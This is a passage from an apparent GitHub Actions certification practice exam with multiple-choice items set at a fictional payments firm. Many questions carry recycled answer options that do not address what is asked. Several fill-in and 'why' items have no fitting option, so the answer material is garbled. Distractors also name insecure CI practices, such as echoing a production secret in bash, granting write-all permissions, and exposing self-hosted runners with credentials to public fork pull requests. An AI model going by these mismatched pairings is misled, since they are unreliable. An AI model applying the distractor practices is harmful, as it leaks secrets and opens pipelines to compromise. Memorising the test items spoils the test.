- **D.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`

### 33. In `kestrelpay/fraud-scorer`, one leg of an 18-job OS/Python matrix fails intermittently during wheel compilation. Order the diagnostic and remediation steps to isolate and resolve the failure without wasting runner minutes on passing legs.

- **A.** Delete `.github/workflows` to hide red checks → Re-run all 48 green matrix legs ten times without reading logs → Run `echo ${{ secrets.PROD_KEY }}` in bash → Set `continue-on-error: true` permanently on test steps
- **B.** Leave `ACTIONS_STEP_DEBUG=true` enabled org-wide forever → SSH directly into standard GitHub-hosted runner VMs on port 22 → Download test artifacts before the upload step executes → Bypass branch protection to merge broken code
- **C.** Wait 90 days until workflow logs expire → Mask exit codes with `|| true` across test scripts → Fire unrelated `release` webhooks manually → Search `_diag/` logs on developer laptops
- **D.** Map the failed job in the run graph to its `matrix` axes → Check step logs for the first non-zero exit / `::error::` → Run `Re-run failed jobs` with `Enable debug logging` → Push the fix and verify all matrix variants pass

### 34. An SRE investigating failed settlement run `1194820331` in `kestrelpay/ledger-api` from an SSH terminal wants GitHub CLI to stream ONLY the failed step logs to stdout without downloading the entire multi-megabyte zip archive. Complete the CLI command: `gh run view 1194820331 ____`.

- **A.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **B.** Query workflow runs and raw ZIP logs via `gh run list` / `gh run view --log-failed` or REST `GET /repos/{owner}/{repo}/actions/runs/{run_id}/logs` (`HTTP 302` signed URL)
- **C.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 35. KestrelPay Clearing's compliance bot queries failed `workflow_dispatch` runs on branch `main` and archives raw run logs via GitHub CLI and REST API. Which two commands/endpoints accurately filter runs and download raw logs? Select two.

- **A.** Query workflow runs and raw ZIP logs via `gh run list` / `gh run view --log-failed` or REST `GET /repos/{owner}/{repo}/actions/runs/{run_id}/logs` (`HTTP 302` signed URL)
- **B.** Enable diagnostic traces (`Re-run jobs -> Enable debug logging`, or set `ACTIONS_STEP_DEBUG=true` and `ACTIONS_RUNNER_DEBUG=true`) and inspect step exit codes (`127`, `137`, `143`)
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **E.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **F.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)

### 36. In `kestrelpay/payments-core`, a 4-leg matrix job calls `actions/upload-artifact@v4` in every leg using identical static `name: junit-report`. Three legs fail with `Conflict: an artifact with this name already exists`. Proposed solution: Keep `actions/upload-artifact@v4` with static `name: junit-report` across all four parallel matrix legs. Does this meet the goal?

- **A.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)
- **B.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement
- **C.** Pair `actions/cache@v4` (`10 GB` repo cache, `7-day` idle eviction) with `actions/upload-artifact@v4` (`retention-days`) and REST retention policies
- **D.** Manage v4 immutable artifacts (`actions/upload-artifact@v4` creates immediate finalized artifacts; use unique names per matrix leg + `download-artifact@v4` `pattern:` + `merge-multiple: true`)

### 37. A release auditor needs to download artifact `sbom-spdx` generated by workflow run `99812234` in `kestrelpay/settlement-gw` from both the terminal and a follow-up workflow run (`not just a downstream job in the same run`). Which CLI flag and `actions/download-artifact@v4` input support cross-run retrieval?

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Manage v4 immutable artifacts (`actions/upload-artifact@v4` creates immediate finalized artifacts; use unique names per matrix leg + `download-artifact@v4` `pattern:` + `merge-multiple: true`)
- **C.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **D.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`

### 38. Downstream repository `kestrelpay/ach-adapter` calls central reusable workflow `jobs.verify.uses: kestrelpay/ci-hub/.github/workflows/rust-verify.yml@a1b2c3d4...` (`40-char SHA`). What are GitHub Actions' nesting depth and per-run reusable-workflow call limits, and why can `uses:` NOT substitute `${{ env.WF_SHA }}`?

- **A.** No — a **Starter workflow** (`.github/workflow-templates/`) copies a one-time static `.yml` file into target repos; future edits never propagate unless you use a `workflow_call` Reusable Workflow
- **B.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Invoke reusable workflows at `jobs.<id>.uses: org/repo/.github/workflows/file.yml@<sha>` (`<=4` nesting levels, executing in the caller repo context)

### 39. Caller workflow `deploy.yml` in `kestrelpay/card-router` invokes reusable workflow `kestrelpay/ci-hub/.github/workflows/k8s-rollout.yml@v2` located in the same `kestrelpay` organization and passes `secrets: inherit`. Under which condition does `secrets: inherit` succeed, and which repository's context does `github.repository` reflect inside the callee?

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Invoke reusable workflows at `jobs.<id>.uses: org/repo/.github/workflows/file.yml@<sha>` (`<=4` nesting levels, executing in the caller repo context)
- **C.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **D.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name

### 40. KestrelPay Clearing's platform engineering group wants every new `Internal` or `Private` Go microservice repository in the `kestrelpay` GitHub Enterprise Cloud organization to see a preconfigured "KestrelPay Go CI" scaffold under `Actions -> New workflow`. Order the steps to publish this non-public starter workflow template.

- **A.** Commit `.properties.json` with no matching `.yml` file → Save SVG icons in `/tmp` on a build runner → Force squads to fork `<org>/.github` → Disable GitHub Actions across the org
- **B.** Create an `Internal`/`Private` `.github` repo in the org → Add `<name>.yml` in `workflow-templates/` (`$default-branch`) → Add `<name>.properties.json` (`name`, `iconName`, `filePatterns`) → Confirm repos see it in `Actions -> New workflow`
- **C.** Publish confidential internal templates to a `Public` personal repo → Add `on: workflow_call` expecting starter templates to run without copying → Put `action.yml` inside `workflow-templates/` → Set `Base permissions = Admin` org-wide
- **D.** Put templates in `.github/workflows/` expecting copies → Omit the required `.properties.json` metadata file → Hardcode `master` instead of `$default-branch` → Expect template edits to update existing repo copies

### 41. Platform architects at KestrelPay Clearing compare Starter Workflow Templates, Reusable Workflows (`workflow_call`), and Composite Actions for standardizing 90 repositories. Which two architectural distinctions are accurate? Select two.

- **A.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`
- **B.** Contrast **Starter workflows** (`one-time copied .yml scaffold in <org>/.github/workflow-templates/`, independent afterward) vs **Reusable workflows** (`central workflow_call job`) vs **Composite actions** (`encapsulated steps`)
- **C.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **D.** Publish one-time scaffold templates in `<org>/.github/workflow-templates/*.yml` + `.properties.json`, and centralize ongoing governed CI logic in `workflow_call` reusable workflows
- **E.** No — a **Starter workflow** (`.github/workflow-templates/`) copies a one-time static `.yml` file into target repos; future edits never propagate unless you use a `workflow_call` Reusable Workflow
- **F.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 42. An experimental benchmark workflow `perf-soak.yml` in `kestrelpay/ledger-api` must be paused for two sprints during a storage migration without losing historical run logs or deleting `.github/workflows/perf-soak.yml` from Git. Complete the GitHub CLI command: `gh workflow ____ perf-soak.yml`.

- **A.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **D.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)

### 43. KestrelPay Clearing maintains an open-source SDK in a `Public` repository `kestrelpay/kestrel-sdk-go` with a nightly `on: schedule` test workflow. After 60 consecutive days with zero commits or repository activity, scheduled runs stop firing automatically. Why?

- **A.** Configure `schedule` (POSIX UTC cron on default branch), `workflow_dispatch`, webhook events (`push`, `pull_request`, `release`), and external `repository_dispatch` (`POST /repos/{owner}/{repo}/dispatches`)
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **D.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`

---

## Domain 3 — Author and maintain actions (15–20% official weight · 19 questions)

### 44. KestrelPay Clearing authors a custom cross-platform credential-helper action in TypeScript that must acquire a temporary lease before main execution and revoke that lease automatically at the end of the job (`even if later steps fail`), running on Ubuntu, Windows, and macOS runners. Which `action.yml` `runs:` schema meets all requirements?

- **A.** Build **JavaScript actions** (`runs.using: "node20"`, `pre:`/`main:`/`post:` entrypoints, `@actions/core` + `@actions/github`, bundled into `dist/index.js`) for fast cross-OS execution
- **B.** Choose **Docker container actions** (`runs.using: "docker"`, custom OS/packages, **Linux runners only**) vs **Composite actions** (`runs.using: "composite"`, cross-OS bundled steps with explicit `shell:`)
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`

### 45. A developer tags `v1.0.0` on JavaScript action `kestrelpay/vault-lease-action` after adding `.gitignore` entries for both `node_modules/` and `dist/`. Consumers immediately fail with `Error: Cannot find module '@actions/core'`. How should the action repository package its dependencies for consumers?

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** Build **JavaScript actions** (`runs.using: "node20"`, `pre:`/`main:`/`post:` entrypoints, `@actions/core` + `@actions/github`, bundled into `dist/index.js`) for fast cross-OS execution

### 46. KestrelPay Clearing's developer productivity squad builds a new `node20` TypeScript action `kestrelpay/iso20022-lint-action` for internal and external consumers. Order the end-to-end authoring, bundling, and release tagging steps.

- **A.** Author `action.yml` (`using: "node20"`, `main: "dist/index.js"`) → Code with `@actions/core` & `core.setFailed()` → Bundle into `dist/index.js` (`@vercel/ncc`) & commit `dist/` → Tag `v1.0.0`, slide `v1`, and document the 40-char SHA
- **B.** Place `action.yml` inside `.github/workflows/` with no root metadata → Set `runs.using: "docker"` for a macOS/Windows helper action → Log secret inputs via `console.log` → Skip SemVer tags completely
- **C.** Gitignore both `dist/` and `node_modules/` in the release commit → Set `runs.using: "node12"` in `action.yml` → Exit raw processes without `@actions/core` → Tell consumers to reference floating `@main` only
- **D.** Cut release `v1.0.0` before authoring `action.yml` → Require every caller repo to run `npm install` first → Embed static caller tokens inside `dist/index.js` → Delete the Git tag right after release

### 47. KestrelPay Clearing's mobile team runs iOS builds on `runs-on: macos-15` and Windows builds on `runs-on: windows-2025`, and needs a custom signing helper action. Proposed solution: Package the signing helper as a Docker container action (`runs.using: 'docker'`) so the identical container runs across `ubuntu-latest`, `macos-15`, and `windows-2025`. Does this meet the goal?

- **A.** Choose **Docker container actions** (`runs.using: "docker"`, custom OS/packages, **Linux runners only**) vs **Composite actions** (`runs.using: "composite"`, cross-OS bundled steps with explicit `shell:`)
- **B.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions
- **C.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement
- **D.** Build **JavaScript actions** (`runs.using: "node20"`, `pre:`/`main:`/`post:` entrypoints, `@actions/core` + `@actions/github`, bundled into `dist/index.js`) for fast cross-OS execution

### 48. You convert a repeated 5-step bash/Python compliance check into a Composite action (`.github/actions/compliance-check/action.yml`) that executes `./scripts/verify.py` bundled inside the action's own directory. Complete the required `run:` step key (`____: bash`) and path variable (`python3 "${{ ____ }}/scripts/verify.py"`).

- **A.** Choose **Docker container actions** (`runs.using: "docker"`, custom OS/packages, **Linux runners only**) vs **Composite actions** (`runs.using: "composite"`, cross-OS bundled steps with explicit `shell:`)
- **B.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`
- **C.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 49. When choosing between Docker container actions, JavaScript actions, and Composite actions for KestrelPay Clearing's internal CI toolkit, which two technical constraints apply? Select two.

- **A.** Choose **Docker container actions** (`runs.using: "docker"`, custom OS/packages, **Linux runners only**) vs **Composite actions** (`runs.using: "composite"`, cross-OS bundled steps with explicit `shell:`)
- **B.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`
- **C.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions
- **D.** Declare `runs.using: "composite"` in `action.yml`, specify `shell:` on every `run:` step, and reference helper scripts via `${{ github.action_path }}`
- **E.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **F.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 50. KestrelPay Clearing enables Immutable Actions publishing for `kestrelpay/semver-gate-action`. When release `v2.1.0` is published as an immutable action package, what happens if a maintainer later tries to delete and re-tag `v2.1.0` onto a different commit, and where is the immutable artifact hosted?

- **A.** Block outbound HTTPS `443` to `pkg.actions.githubusercontent.com` and `ghcr.io` on self-hosted runner firewalls while forcing Immutable Actions
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Adopt **Immutable Actions** (`OCI packages on GHCR / pkg.actions.githubusercontent.com` + Immutable Releases) and fail cleanly with `core.setFailed(err.message)` (`exit code 1`)
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 51. Inside a `node20` custom action in `kestrelpay/ledger-lint`, an unhandled Promise rejection previously exited with code `0`, turning broken PR checks green. Complete the `@actions/core` error call `core.____(error.message)` that logs a structured `::error::` annotation AND sets `process.exitCode = 1` cleanly without killing `post:` hooks.

- **A.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Adopt **Immutable Actions** (`OCI packages on GHCR / pkg.actions.githubusercontent.com` + Immutable Releases) and fail cleanly with `core.setFailed(err.message)` (`exit code 1`)
- **D.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`

### 52. In `action.yml` for a JavaScript action, you declare input `api-timeout` (`required: true`, `default: '30'`). Complete the environment variable name `____` that GitHub Actions populates inside the Node.js process when a caller invokes `with: { api-timeout: '45' }`.

- **A.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`
- **B.** Define `action.yml` (`or action.yaml`) with `name`, `description`, `inputs` (`required`, `default`, `deprecationMessage`), `outputs`, `runs`, and Marketplace `branding` (`icon` + `color`)
- **C.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 53. You prepare `action.yml` in `kestrelpay/openapi-diff-action` with `name`, `author`, `description`, `inputs`, `outputs`, `runs`, and a Marketplace badge configuration. Complete the top-level `action.yml` block `____: { icon: 'shield', color: 'blue' }` that sets the Feather icon and badge color in GitHub Marketplace.

- **A.** Define `action.yml` (`or action.yaml`) with `name`, `description`, `inputs` (`required`, `default`, `deprecationMessage`), `outputs`, `runs`, and Marketplace `branding` (`icon` + `color`)
- **B.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **C.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **D.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)

### 54. You audit `action.yml` files across KestrelPay Clearing's JavaScript, Docker, and Composite actions. Which three `action.yml` metadata rules are enforced by GitHub Actions? Select three.

- **A.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`
- **B.** Target `runs.using: "node20"` in `action.yml` and commit compiled `dist/index.js` (`bundled with @vercel/ncc or esbuild`) so consumers skip `npm install`
- **C.** Choose **Docker container actions** (`runs.using: "docker"`, custom OS/packages, **Linux runners only**) vs **Composite actions** (`runs.using: "composite"`, cross-OS bundled steps with explicit `shell:`)
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **E.** Define `action.yml` (`or action.yaml`) with `name`, `description`, `inputs` (`required`, `default`, `deprecationMessage`), `outputs`, `runs`, and Marketplace `branding` (`icon` + `color`)
- **F.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 55. In `kestrelpay/vault-lease-action`, `pre: dist/setup.js` generates dynamic `leaseId` and ephemeral `dbPassword`, which `main: dist/index.js` and `post: dist/cleanup.js` must read (`revoking leaseId in post`) without exposing `dbPassword` in step logs or caller outputs. Which three `@actions/core` APIs implement this safely?

- **A.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **B.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Use `@actions/core` (`getInput`, `setOutput`, `setSecret`, `exportVariable`, `addPath`, `saveState`/`getState`, `core.summary`) rather than raw `process.env` string hacks

### 56. A maintainer updates an older JavaScript action that previously printed `console.log('::set-output name=digest::sha256:99aa')` and `console.log('::save-state name=pid::412')`. Why did this action break on modern runners, and which `@actions/core` upgrade fixes it?

- **A.** Use `@actions/core` (`getInput`, `setOutput`, `setSecret`, `exportVariable`, `addPath`, `saveState`/`getState`, `core.summary`) rather than raw `process.env` string hacks
- **B.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 57. KestrelPay Clearing wants 45 repositories across its GitHub Enterprise Cloud organization to consume proprietary action `kestrelpay/pci-redactor-action` without exposing proprietary source code publicly AND without bundling a secondary checkout + PAT in every caller workflow. Which repository visibility and setting achieves this?

- **A.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Distribute internal actions via `Internal`/`Private` enterprise repositories (`with Actions Access enabled`, single-repo or monorepo subfolders) vs `Public` OSS repositories
- **D.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 58. Within `kestrelpay/payments-core`, a workflow only needs a repository-local Composite action stored at `.github/actions/rust-fmt/action.yml` in the same repo. What must happen in the job BEFORE `uses: ./.github/actions/rust-fmt` executes?

- **A.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **B.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **C.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **D.** Distribute internal actions via `Internal`/`Private` enterprise repositories (`with Actions Access enabled`, single-repo or monorepo subfolders) vs `Public` OSS repositories

### 59. KestrelPay Clearing maintains a public monorepo `kestrelpay/oss-actions` containing four separate actions in subfolders (`lint/`, `fmt/`, `sbom/`, `bench/`) with NO `action.yml` at the repository root. Proposed solution: Draft a GitHub Release in `kestrelpay/oss-actions` and check `Publish this Action to the GitHub Marketplace` to list all four subfolder actions on Marketplace. Does this meet the goal?

- **A.** Distribute internal actions via `Internal`/`Private` enterprise repositories (`with Actions Access enabled`, single-repo or monorepo subfolders) vs `Public` OSS repositories
- **B.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)
- **C.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **D.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement

### 60. KestrelPay Clearing open-sources `kestrelpay/iso20022-schema-check` as a standalone community action and wants it discoverable in GitHub Marketplace with a verified release tag. Put the Marketplace publication steps in the exact order.

- **A.** Keep the action repository `Private` or `Internal` → Pack 6 actions in subfolders with no root `action.yml` → Skip `2FA` and the Marketplace Developer Agreement → Push branch `dev` without drafting a GitHub Release
- **B.** Reuse an existing official action `name` (`actions/checkout`) → Hide `action.yml` inside `.github/workflows/` → Email a `.zip` archive to GitHub Support → Tag `0.0.0-draft` without release notes
- **C.** Create a `Public` single-action repo with root `action.yml` → Add unique `name`, `description`, `README`, & `branding` → Enable `2FA` & accept the Marketplace Developer Agreement → Draft a Release (`v1.0.0`) checking `Publish to Marketplace`
- **D.** Publish from an EMU user account (`where public repos are blocked`) → Omit `description` and `runs:` from `action.yml` → Commit production `.env` secrets into the repo → Use mutable tag `latest` only

### 61. As maintainer of `kestrelpay/iso20022-schema-check`, you ship backward-compatible feature release `v1.4.0` after `v1.3.2`. How should you update Git tags for standard SemVer consumers while advising security-sensitive enterprise consumers on immutable pinning?

- **A.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **B.** Release immutable SemVer tags (`v1.2.0`), advance convenience major tags (`v1` -> `v1.2.0`) only for non-breaking changes, and recommend **40-char commit SHA** pinning (`with # v1.2.0 comment`)
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

### 62. KestrelPay Clearing enables Dependabot `package-ecosystem: "github-actions"` in `.github/dependabot.yml` across repositories that pin third-party actions to full 40-character commit SHAs (`uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2`). Which two maintenance behaviors occur? Select two.

- **A.** Publish immutable SemVer releases (`v1.2.3`), slide major tag `v1` for compatible updates, and encourage consumers to pin full 40-char commit SHAs (`with Immutable Actions`)
- **B.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **C.** Release immutable SemVer tags (`v1.2.0`), advance convenience major tags (`v1` -> `v1.2.0`) only for non-breaking changes, and recommend **40-char commit SHA** pinning (`with # v1.2.0 comment`)
- **D.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)
- **E.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **F.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

---

## Domain 4 — Manage GitHub Actions for the enterprise (20–25% official weight · 24 questions)

### 63. KestrelPay Clearing's CISO mandates that every pull request targeting `main` across 140 repositories in the `kestrelpay` organization MUST pass `.github/workflows/pci-sast.yml` stored in central repo `kestrelpay/sec-workflows`, even if a repo admin deletes local `.github/workflows/` files. Which governance control enforces this centrally?

- **A.** No — a **Starter workflow** (`.github/workflow-templates/`) copies a one-time static `.yml` file into target repos; future edits never propagate unless you use a `workflow_call` Reusable Workflow
- **B.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **C.** Standardize CI/CD with central `Internal` Reusable Workflows (`workflow_call`) and enforce mandatory org/enterprise checks via **Repository Ruleset Required Workflows**
- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

### 64. To prevent duplication across 12organizations in KestrelPay Clearing's GitHub Enterprise Cloud tenant, platform engineers host approved `workflow_call` pipelines and Composite actions in dedicated `Internal` repo `kestrelpay-platform/golden-ci`. Why is an `Internal` repository preferred over a `Public` or `Private` repository for enterprise-wide CI reuse?

- **A.** Contrast **Starter workflows** (`one-time copied .yml scaffold in <org>/.github/workflow-templates/`, independent afterward) vs **Reusable workflows** (`central workflow_call job`) vs **Composite actions** (`encapsulated steps`)
- **B.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **C.** Standardize CI/CD with central `Internal` Reusable Workflows (`workflow_call`) and enforce mandatory org/enterprise checks via **Repository Ruleset Required Workflows**
- **D.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 65. When an Organization Repository Ruleset enforces required workflow `kestrelpay/sec-workflows/.github/workflows/pci-sast.yml` pinned to `refs/tags/v3.1.0` across 80 repositories, can repository maintainers modify or skip that workflow check by editing `.github/workflows/` inside their own repository?

- **A.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **D.** Standardize CI/CD with central `Internal` Reusable Workflows (`workflow_call`) and enforce mandatory org/enterprise checks via **Repository Ruleset Required Workflows**

### 66. Repository `kestrelpay/shared-signing` has `Private` visibility inside organization `kestrelpay`. When sibling repository `kestrelpay/ledger-api` invokes `uses: kestrelpay/shared-signing/.github/workflows/cosign.yml@v1`, the run fails immediately with `workflow file not found / access denied`. Complete the `kestrelpay/shared-signing` setting path: `Settings -> Actions -> General -> ____ -> Accessible from repositories in the 'kestrelpay' organization`.

- **A.** Set `Repository Settings -> Actions -> General -> Access` on `Internal`/`Private` action repos to `Accessible from repositories in the enterprise` (`or organization`)
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)
- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

### 67. KestrelPay Clearing's Enterprise Owner wants `Internal` repository `kestrelpay-core/shared-actions` in org `kestrelpay-core` to be consumable by workflows in sibling org `kestrelpay-eu` within the same GitHub Enterprise, EXCEPT `Public` repositories must still not gain access. Does `Accessible from repositories in the enterprise` grant `Public` repositories access to private/internal actions?

